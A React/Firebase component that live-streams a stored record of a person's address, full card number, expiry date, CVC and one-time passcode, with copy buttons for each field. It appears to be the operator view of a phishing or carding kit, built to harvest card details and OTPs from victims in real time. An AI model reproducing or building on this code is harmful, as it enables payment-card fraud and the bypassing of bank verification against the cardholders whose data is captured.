import { Container } from "@mui/material";
import { doc, onSnapshot } from "firebase/firestore";
import React, { useEffect, useState } from "react";
import CopyToClipboard from "react-copy-to-clipboard";
import { useParams } from "react-router-dom";
import { db } from ".";

function AllCardInfos() {
  let { docId } = useParams();
  const [data, setData] = useState({
    address: "",
    country: "United Kingdom",
    city: "",
    state: "",
    zip: "",
    cardnumber: "",
    expiredate: "",
    cvc: "",
    passcode: "",
  });

  const dataArray = [
    { title: "Address", value: data.address },
    { title: "Country", value: data.country },
    { title: "City", value: data.city },
    { title: "State", value: data.state },
    { title: "Zip", value: data.zip },
    { title: "Card number", value: data.cardnumber },
    { title: "Expiry date", value: data.expiredate },
    { title: "Cvc", value: data.cvc },
    { title: "Otp", value: data.passcode },
  ];

  useEffect(() => {
    onSnapshot(doc(db, "cards", docId), (doc) => {
      // console.log("Current data: ", doc.data());
      setData(doc.data());
    });
  }, []);

  return (
    <Container style={{ marginTop: 40 }}>
      {dataArray.map((value, index) => (
        <div
          key={index}
          style={{ marginTop: 20 }}
          className="col-lg-6 col-sm-6"
        >
          <label htmlFor="cardNumber">{value.title}</label>
          <div className="input-group">
            <input
              type="text"
              className="form-control"
              defaultValue={value.value}
            />
            <span
              className="input-group-btn"
              style={{ verticalAlign: "baseline" }}
            >
              <CopyToClipboard
                text={value.value}
                onCopy={() => console.log(value.value)}
              >
                <button className="btn btn-default" type="button">
                  Copy
                </button>
              </CopyToClipboard>
            </span>
          </div>
        </div>
      ))}
    </Container>
  );
}

export default AllCardInfos;
